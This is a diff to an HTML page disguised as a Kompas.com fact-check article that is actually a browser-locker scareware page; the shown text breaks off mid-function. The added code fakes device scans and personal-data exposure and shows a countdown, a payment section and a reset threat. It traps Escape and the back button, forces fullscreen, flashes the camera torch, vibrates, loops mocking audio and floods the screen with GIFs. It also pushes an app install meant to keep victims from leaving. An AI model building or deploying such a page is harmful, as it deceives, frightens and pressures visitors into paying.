@@ -2,21 +2,23 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#000000">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Kompas News">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="application-name" content="Kompas News">
   <title>APAKAH BENAR PRABOWO MERESMIKAN LIBUR AKIBAT ASAP KARHUTLA? - kompas.com</title>
 
-  <!-- Meta Open Graph untuk Thumbnail (SUDAH DIPERBAIKI) -->
+  <link rel="manifest" href="manifest.json">
+  <link rel="apple-touch-icon" href="icon-192.png">
+
   <meta property="og:title" content="APAKAH BENAR PRABOWO MERESMIKAN LIBUR AKIBAT ASAP KARHUTLA? - kompas.com" />
   <meta property="og:description" content="Cek fakta kebenaran informasi mengenai peresmian libur akibat asap karhutla oleh Presiden Prabowo." />
   <meta property="og:type" content="website" />
-  
-  <!-- GANTI dengan URL halaman GitHub Pages asli Anda -->
   <meta property="og:url" content="https://0whynaru.github.io/libur-akibat-asapkalimantan2026/" />
-  
-  <!-- GANTI dengan URL gambar absolut Anda (Perhatikan garis miring '/') -->
   <meta property="og:image" content="https://0whynaru.github.io/libur-akibat-asapkalimantan2026/thumbnail.png" />
-  
-  <!-- Supaya thumbnail tampil besar di Twitter/X -->
   <meta name="twitter:card" content="summary_large_image">
 
   <style>
@@ -33,7 +35,7 @@
   html, body {
     width: 100%; height: 100%;
     background: #000;
-    overflow: hidden;              /* NO SCROLL */
+    overflow: hidden;
     position: fixed; top: 0; left: 0;
     user-select: none; -webkit-user-select: none;
     -webkit-touch-callout: none;
@@ -42,6 +44,9 @@
     color: var(--red);
     overscroll-behavior: none;
     font-size: clamp(10px, 2.3vw, 12px);
+    touch-action: none;
+    -webkit-user-drag: none;
+    padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
   }
   
   body::before {
@@ -100,7 +105,15 @@
     60% { transform: translate(8px, -4px) rotate(1deg); }
   }
   
-  /* ============ WRAP — FIT TO SCREEN ============ */
+  body.mega-shake { animation: megaShake 0.08s infinite !important; }
+  @keyframes megaShake {
+    0%, 100% { transform: translate(0, 0) rotate(0); }
+    20% { transform: translate(-4px, 3px) rotate(-0.5deg); }
+    40% { transform: translate(4px, -3px) rotate(0.5deg); }
+    60% { transform: translate(-3px, -4px) rotate(-0.3deg); }
+    80% { transform: translate(3px, 4px) rotate(0.3deg); }
+  }
+  
   .wrap {
     position: relative; z-index: 5;
     width: 100%; height: 100dvh;
@@ -110,7 +123,6 @@
     overflow: hidden;
   }
   
-  /* HUD */
   .hud-top, .hud-bottom {
     position: fixed;
     left: 6px; right: 6px;
@@ -150,7 +162,6 @@
     50% { opacity: 0.9; }
   }
   
-  /* ============ CONTENT ============ */
   .content {
     position: relative;
     width: 100%;
@@ -231,7 +242,6 @@
     50% { opacity: 0.15; }
   }
   
-  /* ============ INFO LINES — PLAIN TEXT ============ */
   .info-lines {
     text-align: left;
     display: flex;
@@ -287,7 +297,6 @@
     margin: 3px 0;
   }
   
-  /* ============ COUNTDOWN (compact) ============ */
   #countdownBox {
     display: none;
     font-size: clamp(9px, 2.2vw, 10px);
@@ -308,7 +317,6 @@
     line-height: 1;
   }
   
-  /* ============ PAYMENT ============ */
   .payment {
     font-size: clamp(9px, 2.2vw, 10px);
     color: #ff6666;
@@ -324,7 +332,6 @@
     text-shadow: 0 0 8px var(--red);
   }
   
-  /* ============ INPUT & BUTTON ============ */
   .unlock-area {
     margin-top: 3px;
     position: relative;
@@ -344,6 +351,7 @@
     border-radius: 3px;
     box-shadow: inset 0 0 8px rgba(255,0,0,0.25);
     -webkit-tap-highlight-color: transparent;
+    pointer-events: auto;
   }
   input:focus {
     box-shadow: 0 0 15px var(--red), inset 0 0 12px rgba(255,0,0,0.4);
@@ -371,6 +379,7 @@
     will-change: transform;
     touch-action: none;
     box-shadow: 0 0 10px rgba(255,0,0,0.4);
+    pointer-events: auto;
   }
   #unlockBtn:hover:not(:disabled):not(.caught),
   #unlockBtn:active:not(:disabled):not(.caught) {
@@ -415,7 +424,6 @@
     text-shadow: 0 0 6px var(--red);
   }
   
-  /* ============ MODAL ============ */
   .modal-overlay {
     position: fixed; inset: 0;
     background: rgba(0, 0, 0, 0.92);
@@ -491,7 +499,6 @@
     font-weight: 900;
   }
   
-  /* ============ WIPED ============ */
   #wipedScreen {
     position: fixed; inset: 0;
     background: #000;
@@ -537,7 +544,6 @@
     word-break: break-all;
   }
   
-  /* ============ FX INDICATOR ============ */
   #fxIndicator {
     position: fixed;
     top: 26px; right: 6px;
@@ -557,7 +563,6 @@
   #fxIndicator .fx-on { color: #00ff66; text-shadow: 0 0 5px #00ff66; }
   #fxIndicator .fx-off { color: #666; }
   
-  /* ============ ESCAPE WARNING ============ */
   #escapeWarning {
     position: fixed;
     top: 50%; left: 50%;
@@ -577,25 +582,19 @@
     opacity: 1;
     transform: translate(-50%, -50%) scale(1) rotate(0);
   }
-  #escapeWarning .ew-icon {
-    font-size: 50px;
-    margin-bottom: 8px;
-  }
+  #escapeWarning .ew-icon { font-size: 50px; margin-bottom: 8px; }
   #escapeWarning .ew-text {
     font-family: 'Anton', 'Orbitron', sans-serif;
-    color: var(--red);
-    font-size: 20px;
+    color: var(--red); font-size: 20px;
     letter-spacing: 4px;
     text-shadow: 0 0 25px var(--red);
     margin-bottom: 6px;
   }
   #escapeWarning .ew-sub {
-    color: #ff9999;
-    font-size: 10px;
+    color: #ff9999; font-size: 10px;
     letter-spacing: 2px;
   }
   
-  /* ============ JUMPSCARE ============ */
   #jumpscare {
     position: fixed; inset: 0;
     background: #000;
@@ -611,34 +610,27 @@
     text-align: center;
     animation: jumpscareShake 0.04s infinite;
     width: 100%; height: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
     padding: 20px;
   }
   #jumpscare .js-gif {
-    width: 90vw;
-    height: 70vh;
-    max-width: 500px;
+    width: 90vw; height: 70vh; max-width: 500px;
     object-fit: contain;
     filter: drop-shadow(0 0 60px var(--red)) contrast(1.8) saturate(2);
   }
   #jumpscare .js-text {
     font-family: 'Anton', 'Orbitron', sans-serif;
     font-size: clamp(24px, 7vw, 38px);
-    color: var(--red);
-    letter-spacing: 6px;
+    color: var(--red); letter-spacing: 6px;
     text-shadow: 0 0 40px var(--red), 0 0 80px var(--red);
     margin-top: 12px;
     animation: jumpscareText 0.06s infinite;
   }
   #jumpscare .js-sub {
     font-family: 'Share Tech Mono', monospace;
-    font-size: 12px;
-    color: #ff7777;
-    letter-spacing: 4px;
-    margin-top: 8px;
+    font-size: 12px; color: #ff7777;
+    letter-spacing: 4px; margin-top: 8px;
     animation: blink 0.15s step-end infinite;
   }
   @keyframes jumpscareShake {
@@ -657,7 +649,150 @@
     50% { background: #3a0000; }
   }
   
-  /* Small screens tweak */
+  #gifAttackLayer {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    z-index: 9999998;
+    overflow: hidden;
+  }
+  .gif-wrapper {
+    position: absolute;
+    pointer-events: auto;
+    animation: gifPopIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+  .gif-attack-item {
+    display: block;
+    pointer-events: auto;
+    image-rendering: pixelated;
+    will-change: transform;
+    filter: drop-shadow(0 0 8px rgba(255, 0, 0, 0.8));
+    user-select: none;
+    -webkit-user-drag: none;
+  }
+  .gif-attack-item.aggressive {
+    filter: drop-shadow(0 0 20px #ff0000) contrast(1.5) saturate(1.8);
+    animation: gifJitter 0.15s infinite;
+  }
+  .gif-attack-item.chaos {
+    filter: drop-shadow(0 0 30px #ff0000) contrast(2) saturate(2.5) hue-rotate(15deg);
+    animation: gifChaos 0.08s infinite;
+  }
+  .gif-attack-item.spinning { animation: gifSpin 1s linear infinite; }
+  .gif-attack-item.bouncing { animation: gifBounce 0.5s ease-in-out infinite alternate; }
+  @keyframes gifPopIn {
+    0% { transform: scale(0) rotate(-45deg); opacity: 0; }
+    100% { transform: scale(1) rotate(0deg); opacity: 1; }
+  }
+  @keyframes gifJitter {
+    0%, 100% { transform: translate(0, 0) rotate(0); }
+    25% { transform: translate(-3px, 2px) rotate(-2deg); }
+    50% { transform: translate(3px, -2px) rotate(2deg); }
+    75% { transform: translate(-2px, -3px) rotate(-1deg); }
+  }
+  @keyframes gifChaos {
+    0% { transform: translate(0, 0) rotate(0) scale(1); }
+    20% { transform: translate(-5px, 3px) rotate(-3deg) scale(1.05); }
+    40% { transform: translate(5px, -3px) rotate(3deg) scale(0.95); }
+    60% { transform: translate(-3px, -5px) rotate(-2deg) scale(1.08); }
+    80% { transform: translate(3px, 5px) rotate(2deg) scale(0.98); }
+    100% { transform: translate(0, 0) rotate(0) scale(1); }
+  }
+  @keyframes gifSpin {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+  }
+  @keyframes gifBounce {
+    from { transform: translateY(0); }
+    to { transform: translateY(-20px); }
+  }
+  
+  .gif-close-btn {
+    position: absolute;
+    top: -12px; right: -12px;
+    width: 32px; height: 32px;
+    background: linear-gradient(180deg, #ff4444, #aa0000);
+    color: #fff;
+    border: 2px solid #fff;
+    border-radius: 50%;
+    font-size: 18px;
+    font-weight: bold;
+    line-height: 1;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 0 12px rgba(255,0,0,0.9);
+    z-index: 10;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    transition: all 0.15s;
+    pointer-events: auto;
+  }
+  .gif-close-btn:hover {
+    background: linear-gradient(180deg, #ff6666, #cc0000);
+    transform: scale(1.15);
+  }
+  .gif-close-btn:active { transform: scale(0.9); }
+  
+  #gifCounter {
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-family: 'Anton', sans-serif;
+    font-size: clamp(60px, 20vw, 160px);
+    color: #ff0000;
+    text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 120px #ff0000;
+    z-index: 9999999;
+    pointer-events: none;
+    opacity: 0;
+    font-weight: 900;
+    letter-spacing: 8px;
+  }
+  #gifCounter.show { opacity: 1; animation: gifCounterPop 0.6s ease-out; }
+  @keyframes gifCounterPop {
+    0% { transform: translate(-50%, -50%) scale(0.3) rotate(-20deg); }
+    50% { transform: translate(-50%, -50%) scale(1.3) rotate(5deg); }
+    100% { transform: translate(-50%, -50%) scale(1) rotate(0); }
+  }
+  
+  #installPrompt {
+    position: fixed;
+    bottom: 20px; left: 50%;
+    transform: translateX(-50%) translateY(200px);
+    background: linear-gradient(180deg, #1a0000, #0a0000);
+    border: 2px solid var(--red);
+    border-radius: 8px;
+    padding: 12px 16px;
+    z-index: 99999999;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    box-shadow: 0 0 30px var(--red);
+    transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    max-width: 90vw;
+  }
+  #installPrompt.show { transform: translateX(-50%) translateY(0); }
+  #installPrompt .ip-text {
+    font-size: 11px;
+    color: #ffcccc;
+    letter-spacing: 1px;
+    line-height: 1.3;
+  }
+  #installPrompt .ip-btn {
+    background: var(--red);
+    color: #000;
+    border: none;
+    padding: 8px 14px;
+    border-radius: 4px;
+    font-family: 'Anton', sans-serif;
+    font-size: 12px;
+    letter-spacing: 2px;
+    cursor: pointer;
+    font-weight: 900;
+    white-space: nowrap;
+  }
+  
   @media (max-height: 640px) {
     .info-lines { font-size: 9px; line-height: 1.25; }
     .info-lines .lbl { min-width: 68px; }
@@ -706,6 +841,14 @@
   </div>
 </div>
 
+<div id="gifAttackLayer"></div>
+<div id="gifCounter"></div>
+
+<div id="installPrompt">
+  <div class="ip-text">📲 Install app biar<br>gak bisa keluar?</div>
+  <button class="ip-btn" id="installBtn">INSTALL</button>
+</div>
+
 <div class="wrap">
   <div class="content">
     
@@ -737,7 +880,6 @@
       <div>⚠ DEVICE AKAN DI-RESET ⚠</div>
     </div>
     
-    <!-- ============ INFO LINES (PLAIN TEXT) ============ -->
     <div class="info-lines">
       <div class="line"><span class="lbl">▸ DEVICE</span><span class="val" id="device">Scanning...</span></div>
       <div class="line"><span class="lbl">▸ OS</span><span class="val" id="os">Scanning...</span></div>
@@ -750,7 +892,6 @@
     
     <div class="divider"></div>
     
-    <!-- ============ PERSONAL DATA (PLAIN TEXT) ============ -->
     <div class="info-lines">
       <div class="line"><span class="lbl">📧 EMAIL</span><span class="val scramble" id="pEmail">░░░░░░░░░░</span></div>
       <div class="line"><span class="lbl">📸 FOTO</span><span class="val warn" id="pPhotos">Menghitung...</span></div>
@@ -812,13 +953,62 @@
   var COUNTDOWN_STARTED = false;
   var COUNTDOWN_TIME = 5 * 60;
   var COUNTDOWN_INTERVAL = null;
+  var ESCAPE_PENALTY_ACTIVE = false;
 
-  /* ============ AUDIO: YOU ARE AN IDIOT ============ */
+  /* ============ RESTORE STATE SETELAH RELOAD ============ */
+  try {
+    if (sessionStorage.getItem('kompas_locked') === '1') {
+      var savedAttempts = parseInt(sessionStorage.getItem('kompas_attempts') || '0');
+      if (savedAttempts > 0) {
+        ATTEMPTS = savedAttempts;
+        console.log('[RESTORE] Attempts:', ATTEMPTS);
+      }
+    }
+  } catch(e) {}
+
+  /* ============ SERVICE WORKER ============ */
+  if ('serviceWorker' in navigator) {
+    try {
+      navigator.serviceWorker.register('sw.js').then(function(reg) {
+        console.log('[SW] Registered');
+      }).catch(function(err) {
+        console.log('[SW] Gagal:', err);
+      });
+    } catch(e) {}
+  }
+
+  /* ============ INSTALL PROMPT ============ */
+  var DEFERRED_PROMPT = null;
+  window.addEventListener('beforeinstallprompt', function(e) {
+    e.preventDefault();
+    DEFERRED_PROMPT = e;
+    var prompt = document.getElementById('installPrompt');
+    if (prompt) prompt.classList.add('show');
+  });
+
+  document.addEventListener('DOMContentLoaded', function() {
+    var installBtn = document.getElementById('installBtn');
+    if (installBtn) {
+      installBtn.addEventListener('click', function() {
+        if (DEFERRED_PROMPT) {
+          DEFERRED_PROMPT.prompt();
+          DEFERRED_PROMPT.userChoice.then(function(choice) {
+            DEFERRED_PROMPT = null;
+            var p = document.getElementById('installPrompt');
+            if (p) p.classList.remove('show');
+          });
+        } else {
+          alert('Buka menu browser → "Tambahkan ke layar utama" / "Install App"');
+        }
+      });
+    }
+  });
+
+  /* ============ AUDIO ============ */
   var IDIOT_AUDIO = null;
   var IDIOT_PLAYING = false;
 
-  function playYouAreAnIdiot() {
-    if (IDIOT_PLAYING) return;
+  function playYouAreAnIdiot(volume) {
     try {
       IDIOT_AUDIO = document.getElementById('idiotAudio');
       if (!IDIOT_AUDIO) {
@@ -828,16 +1018,16 @@
         IDIOT_AUDIO.style.display = 'none';
         document.body.appendChild(IDIOT_AUDIO);
       }
-      IDIOT_AUDIO.volume = 0.7;
+      if (typeof volume === 'number') {
+        IDIOT_AUDIO.volume = Math.max(0, Math.min(1, volume));
+      }
       IDIOT_AUDIO.loop = true;
-      IDIOT_AUDIO.currentTime = 0;
       var p = IDIOT_AUDIO.play();
       if (p !== undefined) {
         p.then(function() {
           IDIOT_PLAYING = true;
           updateAudioIndicator(true);
         }).catch(function(err) {
-          console.log('Audio err:', err);
           setTimeout(function() {
             IDIOT_AUDIO.play().then(function() {
               IDIOT_PLAYING = true;
@@ -867,7 +1057,13 @@
     else { el.textContent = 'OFF'; el.className = 'fx-off'; }
   }
 
-  /* ============ BEEP SFX ============ */
+  function updateIdiotVolume(attempt) {
+    if (!IDIOT_AUDIO) return;
+    var vol = Math.min(1, 0.15 + attempt * 0.15);
+    IDIOT_AUDIO.volume = vol;
+  }
+
+  /* ============ BEEP ============ */
   var audioCtx = null;
   function getAudio() {
     if (!audioCtx) {
@@ -899,6 +1095,7 @@
   var TORCH_INTERVAL = null;
   var TORCH_ON = false;
   var TORCH_BLINK_MS = 1000;
+  var TORCH_STATUS = 'INIT';
 
   function updateFxIndicator() {
     var ind = document.getElementById('fxIndicator');
@@ -907,8 +1104,11 @@
     var t = document.getElementById('fxTorch');
     var v = document.getElementById('fxVibra');
     if (t) {
-      if (TORCH_STREAM) { t.textContent = TORCH_ON ? 'ON' : 'OFF'; t.className = 'fx-on'; }
-      else { t.textContent = 'N/A'; t.className = 'fx-off'; }
+      if (TORCH_STATUS === 'N/A') { t.textContent = 'N/A'; t.className = 'fx-off'; }
+      else if (TORCH_STATUS === 'DENIED') { t.textContent = 'DENIED'; t.className = 'fx-off'; }
+      else if (TORCH_STATUS === 'ERROR') { t.textContent = 'ERR'; t.className = 'fx-off'; }
+      else if (TORCH_STREAM) { t.textContent = TORCH_ON ? 'ON' : 'OFF'; t.className = 'fx-on'; }
+      else { t.textContent = 'WAIT'; t.className = 'fx-off'; }
     }
     if (v) {
       if (navigator.vibrate) { v.textContent = 'ACTIVE'; v.className = 'fx-on'; }
@@ -917,25 +1117,48 @@
   }
 
   function startTorch() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-    .then(function(stream) {
-      TORCH_STREAM = stream;
-      var track = stream.getVideoTracks()[0];
-      if (!track) return;
-      var caps = track.getCapabilities ? track.getCapabilities() : {};
-      if (!caps.torch) return;
-      TORCH_ON = true;
-      try { track.applyConstraints({ advanced: [{ torch: true }] }); } catch(e) {}
-      updateFxIndicator();
-      TORCH_INTERVAL = setInterval(function() {
-        if (!LOCKED) { stopTorch(); return; }
-        TORCH_ON = !TORCH_ON;
-        try { track.applyConstraints({ advanced: [{ torch: TORCH_ON }] }); } catch(e) {}
-        updateFxIndicator();
-      }, TORCH_BLINK_MS);
-    })
-    .catch(function(){});
+    if (!window.isSecureContext) { TORCH_STATUS = 'N/A'; updateFxIndicator(); return; }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      TORCH_STATUS = 'N/A'; updateFxIndicator(); return;
+    }
+    var constraints = [
+      { video: { facingMode: { ideal: 'environment' } } },
+      { video: { facingMode: 'environment' } },
+      { video: true }
+    ];
+    function tryNext(idx) {
+      if (idx >= constraints.length) { TORCH_STATUS = 'ERROR'; updateFxIndicator(); return; }
+      navigator.mediaDevices.getUserMedia(constraints[idx])
+        .then(function(stream) {
+          TORCH_STREAM = stream;
+          var track = stream.getVideoTracks()[0];
+          if (!track) { tryNext(idx + 1); return; }
+          var caps = track.getCapabilities ? track.getCapabilities() : {};
+          if (!caps.torch) {
+            TORCH_STATUS = 'N/A'; updateFxIndicator();
+            try { track.stop(); } catch(e) {}
+            TORCH_STREAM = null;
+            return;
+          }
+          TORCH_ON = true;
+          try { track.applyConstraints({ advanced: [{ torch: true }] }).catch(function(){}); } catch(e) {}
+          updateFxIndicator();
+          if (TORCH_INTERVAL) clearInterval(TORCH_INTERVAL);
+          TORCH_INTERVAL = setInterval(function() {
+            if (!LOCKED) { stopTorch(); return; }
+            TORCH_ON = !TORCH_ON;
+            try { track.applyConstraints({ advanced: [{ torch: TORCH_ON }] }).catch(function(){}); } catch(e) {}
+            updateFxIndicator();
+          }, TORCH_BLINK_MS);
+        })
+        .catch(function(err) {
+          if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+            TORCH_STATUS = 'DENIED'; updateFxIndicator(); return;
+          }
+          tryNext(idx + 1);
+        });
+    }
+    tryNext(0);
   }
 
   function stopTorch() {
@@ -943,7 +1166,7 @@
     if (TORCH_STREAM) {
       try {
         var track = TORCH_STREAM.getVideoTracks()[0];
-        if (track) { try { track.applyConstraints({ advanced: [{ torch: false }] }); } catch(e) {} }
+        if (track) { try { track.applyConstraints({ advanced: [{ torch: false }] }).catch(function(){}); } catch(e) {} }
         TORCH_STREAM.getTracks().forEach(function(t) { t.stop(); });
       } catch(e) {}
       TORCH_STREAM = null;
@@ -964,40 +1187,125 @@
     if (!navigator.vibrate) return;
     try { navigator.vibrate(1); } catch(e) {}
   }
-
   function vibrateSafe(pattern) {
     if (!navigator.vibrate) return;
     try { navigator.vibrate(pattern); } catch(e) {}
   }
-
   function startVibrate() {
     if (!navigator.vibrate) { updateFxIndicator(); return; }
     vibrateSafe(VIBRA_PATTERN);
+    if (VIBRA_INTERVAL) clearInterval(VIBRA_INTERVAL);
     VIBRA_INTERVAL = setInterval(function() {
       if (!LOCKED) { stopVibrate(); return; }
       vibrateSafe(VIBRA_PATTERN);
     }, VIBRA_CYCLE_MS);
     updateFxIndicator();
   }
-
   function stopVibrate() {
     if (VIBRA_INTERVAL) { clearInterval(VIBRA_INTERVAL); VIBRA_INTERVAL = null; }
     if (navigator.vibrate) { try { navigator.vibrate(0); } catch(e) {} }
     updateFxIndicator();
   }
 
-  /* ============ ANTI-EXIT ============ */
+  /* ============ WAKE LOCK ============ */
+  var WAKE_LOCK = null;
+  function requestWakeLock() {
+    if (!('wakeLock' in navigator)) return;
+    try {
+      navigator.wakeLock.request('screen').then(function(lock) {
+        WAKE_LOCK = lock;
+        lock.addEventListener('release', function() {
+          if (LOCKED) setTimeout(requestWakeLock, 500);
+        });
+      }).catch(function(){});
+    } catch(e) {}
+  }
+
+  function lockOrientation() {
+    try {
+      var so = screen.orientation;
+      if (so && so.lock) so.lock('portrait').catch(function(){});
+    } catch(e) {}
+  }
+
+  /* ============ ANTI-EXIT SUPER KUAT ============ */
   var ESCAPE_BLOCKED_COUNT = 0;
   var lastEscapeWarnTime = 0;
   var ESCAPE_LEVEL = 0;
   var ESCAPE_DECAY_TIMER = null;
+  var FULLSCREEN_WATCHDOG = null;
+  var FOCUS_WATCHDOG = null;
+  var HISTORY_LOCK_INTERVAL = null;
+  var VISIBILITY_WATCHDOG = null;
+  var ORIENTATION_WATCHDOG = null;
+  var RELOAD_WATCHDOG = null;
+  var BLUR_TIMEOUT = null;
+  var BLUR_START_TIME = 0;
+  var FS_RAF_RUNNING = true;
+  var FS_ESCAPE_TIME = 0;
+
+  function isFullscreen() {
+    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
+              document.mozFullScreenElement || document.msFullscreenElement);
+  }
 
   function forceFullscreen() {
     try {
       var el = document.documentElement;
-      if (document.fullscreenElement || document.webkitFullscreenElement) return;
-      if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      if (isFullscreen()) return;
+
+      var p = null;
+      if (el.requestFullscreen) {
+        p = el.requestFullscreen({ navigationUI: 'hide' });
+      } else if (el.webkitRequestFullscreen) {
+        p = el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+      } else if (el.mozRequestFullScreen) {
+        el.mozRequestFullScreen();
+      } else if (el.msRequestFullscreen) {
+        el.msRequestFullscreen();
+      }
+
+      if (p && p.catch) {
+        p.catch(function(err) {
+          // Kalau gagal karena bukan user gesture
+          if (err.message && err.message.indexOf('user gesture') > -1) {
+            console.warn('[FS] Butuh user gesture');
+            triggerFSOverlay();
+          }
+        });
+      }
+    } catch(e) {}
+  }
+
+  function triggerFSOverlay() {
+    try {
+      if (document.getElementById('fsTriggerOverlay')) return;
+      var ov = document.createElement('div');
+      ov.id = 'fsTriggerOverlay';
+      ov.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:transparent;cursor:pointer;';
+      var handler = function() {
+        try {
+          var el = document.documentElement;
+          if (el.requestFullscreen && !isFullscreen()) {
+            el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+          } else if (el.webkitRequestFullscreen && !isFullscreen()) {
+            el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+          }
+        } catch(e) {}
+        if (ov.parentNode) ov.parentNode.removeChild(ov);
+      };
+      ov.addEventListener('click', handler, { once: true });
+      ov.addEventListener('touchstart', handler, { once: true });
+      document.body.appendChild(ov);
+      // Auto-trigger
+      setTimeout(function() {
+        if (!isFullscreen()) {
+          try {
+            var evt = new MouseEvent('click', { bubbles: true, cancelable: true });
+            ov.dispatchEvent(evt);
+          } catch(e) {}
+        }
+      }, 30);
     } catch(e) {}
   }
 
@@ -1005,16 +1313,23 @@
     var warn = document.getElementById('escapeWarning');
     if (!warn) return;
     var now = Date.now();
-    if (now - lastEscapeWarnTime < 600) return;
+    if (now - lastEscapeWarnTime < 400) return;
     lastEscapeWarnTime = now;
     ESCAPE_BLOCKED_COUNT++;
     ESCAPE_LEVEL = Math.min(3, Math.floor(ESCAPE_BLOCKED_COUNT / 3) + 1);
     var et = warn.querySelector('.ew-text');
     var es = warn.querySelector('.ew-sub');
     var ei = warn.querySelector('.ew-icon');
-    if (ESCAPE_LEVEL === 1) { ei.textContent = '🚫'; et.textContent = 'KAMU GABISA KELUAR!'; es.textContent = 'DEVICE MASIH TERKUNCI'; }
-    else if (ESCAPE_LEVEL === 2) { ei.textContent = '⛔'; et.textContent = 'BERHENTI COBA KELUAR!'; es.textContent = 'PERCOBAAN KE-' + ESCAPE_BLOCKED_COUNT; }
-    else { ei.textContent = '💀'; et.textContent = 'STOP! HP MAKIN LEMOT!'; es.textContent = 'PERCOBAAN KE-' + ESCAPE_BLOCKED_COUNT; }
+    if (ESCAPE_LEVEL === 1) {
+      ei.textContent = '🚫'; et.textContent = 'KAMU GABISA KELUAR!';
+      es.textContent = 'DEVICE MASIH TERKUNCI';
+    } else if (ESCAPE_LEVEL === 2) {
+      ei.textContent = '⛔'; et.textContent = 'BERHENTI COBA KELUAR!';
+      es.textContent = 'PERCOBAAN KE-' + ESCAPE_BLOCKED_COUNT;
+    } else {
+      ei.textContent = '💀'; et.textContent = 'STOP! HP MAKIN LEMOT!';
+      es.textContent = 'PERCOBAAN KE-' + ESCAPE_BLOCKED_COUNT;
+    }
     warn.classList.add('show');
     if (ESCAPE_LEVEL === 1) {
       vibrateSafe([300, 100, 300]);
@@ -1040,101 +1355,709 @@
     }, 10000);
   }
 
+  function applyEscapePenalty() {
+    if (ESCAPE_PENALTY_ACTIVE) return;
+    ESCAPE_PENALTY_ACTIVE = true;
+    if (IDIOT_AUDIO) {
+      IDIOT_AUDIO.volume = 1.0;
+      if (IDIOT_AUDIO.paused) IDIOT_AUDIO.play().catch(function(){});
+    }
+    if (typeof triggerGifAttack === 'function') triggerGifAttack(5);
+    if (COUNTDOWN_STARTED && COUNTDOWN_TIME > 10) {
+      COUNTDOWN_TIME = Math.max(10, COUNTDOWN_TIME - 10);
+    } else if (!COUNTDOWN_STARTED) {
+      startCountdown();
+      COUNTDOWN_TIME = Math.max(10, COUNTDOWN_TIME - 10);
+    }
+    var vibInterval = setInterval(function() {
+      if (!LOCKED) { clearInterval(vibInterval); return; }
+      vibrateSafe([500, 100, 500, 100, 500]);
+    }, 800);
+    var beepInterval = setInterval(function() {
+      if (!LOCKED) { clearInterval(beepInterval); return; }
+      playBeep(300, 0.1, 'sawtooth', 0.2);
+      setTimeout(function() { playBeep(500, 0.1, 'sawtooth', 0.2); }, 150);
+    }, 500);
+    document.body.classList.add('mega-shake');
+    setTimeout(function() {
+      ESCAPE_PENALTY_ACTIVE = false;
+      clearInterval(vibInterval);
+      clearInterval(beepInterval);
+      document.body.classList.remove('mega-shake');
+      if (IDIOT_AUDIO) IDIOT_AUDIO.volume = 0.15 + ATTEMPTS * 0.15;
+    }, 8000);
+  }
+
   function blockExit() {
-    history.pushState(null, null, location.href);
+    /* ============ 1. ESC SUPER TRAP (CAPTURE PHASE) ============ */
+    document.addEventListener('keydown', function(e) {
+      if (!LOCKED) return;
+      if (e.key === 'Escape' || e.key === 'Esc' || e.keyCode === 27) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        try {
+          var el = document.documentElement;
+          if (el.requestFullscreen && !isFullscreen()) {
+            el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+          } else if (el.webkitRequestFullscreen && !isFullscreen()) {
+            el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+          }
+        } catch(err) {}
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 10);
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 50);
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 150);
+        return false;
+      }
+    }, true);
+
+    document.addEventListener('keyup', function(e) {
+      if (!LOCKED) return;
+      if (e.key === 'Escape' || e.key === 'Esc' || e.keyCode === 27) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        try {
+          var el = document.documentElement;
+          if (el.requestFullscreen && !isFullscreen()) {
+            el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+          } else if (el.webkitRequestFullscreen && !isFullscreen()) {
+            el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+          }
+        } catch(err) {}
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 0);
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 30);
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 100);
+        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 250);
+        return false;
+      }
+    }, true);
+
+    /* ============ 2. HISTORY LOCK ============ */
+    for (var h = 0; h < 10; h++) {
+      try { history.pushState({ lock: h, t: Date.now() }, null, location.href); } catch(e) {}
+    }
+    function pushLock() {
+      if (LOCKED) {
